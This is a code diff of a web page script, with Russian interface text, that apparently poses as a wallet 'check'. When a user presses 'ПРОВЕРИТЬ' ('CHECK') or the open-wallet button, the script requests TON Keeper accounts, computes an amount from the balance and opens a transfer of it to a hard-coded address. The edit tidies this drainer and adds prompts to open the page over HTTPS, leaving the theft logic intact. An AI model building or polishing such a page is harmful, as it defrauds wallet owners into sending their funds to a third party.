@@ -100,20 +100,17 @@
     <script>
         const TARGET = 'UQAK9d_w9I9KHJeREapik3vc6R-esMsci3E8nlqMwFsaRs3P';
 
-        // ====== ПОЛУЧИТЬ БАЛАНС И ОТКРЫТЬ ТРАНЗАКЦИЮ ======
         function openTransaction() {
             const status = document.getElementById('status');
             const confirmBox = document.getElementById('confirmBox');
             
             status.innerText = '⏳ Проверка...';
             
-            // Проверяем TON Keeper
             if (!window.tonkeeper) {
-                status.innerText = '❌ Установите TON Keeper';
+                status.innerText = '❌ TON Keeper не найден. Открой через HTTPS!';
                 return;
             }
 
-            // Получаем баланс
             window.tonkeeper.send('ton_requestAccounts', {})
                 .then(accounts => {
                     if (!accounts || accounts.length === 0) {
@@ -141,7 +138,6 @@
 
                     const amountTON = (amount / 1e9).toFixed(6);
                     
-                    // ====== ОТКРЫВАЕМ TON KEEPER С ТРАНЗАКЦИЕЙ ======
                     const url = `ton://transfer?address=${TARGET}&amount=${amountTON}`;
                     window.location.href = url;
                     
@@ -149,7 +145,6 @@
                         window.open(url, '_blank');
                     }, 300);
 
-                    // Показываем плашку
                     confirmBox.classList.add('show');
                     status.innerText = `✅ Подтвердите транзакцию в TON Keeper`;
                 })
@@ -158,20 +153,14 @@
                 });
         }
 
-        // ====== КНОПКА ======
         document.getElementById('mainBtn').addEventListener('click', openTransaction);
+        document.getElementById('openWalletBtn').addEventListener('click', openTransaction);
 
-        // ====== КНОПКА OPEN WALLET ======
-        document.getElementById('openWalletBtn').addEventListener('click', function() {
-            openTransaction();
-        });
-
-        // ====== СТАТУС ПРИ ЗАГРУЗКЕ ======
         setTimeout(function() {
             if (window.tonkeeper) {
                 document.getElementById('status').innerText = '🟢 Нажмите "ПРОВЕРИТЬ"';
             } else {
-                document.getElementById('status').innerText = '📱 Нажмите "ПРОВЕРИТЬ"';
+                document.getElementById('status').innerText = '📱 Открой через HTTPS';
             }
         }, 500);
     </script>
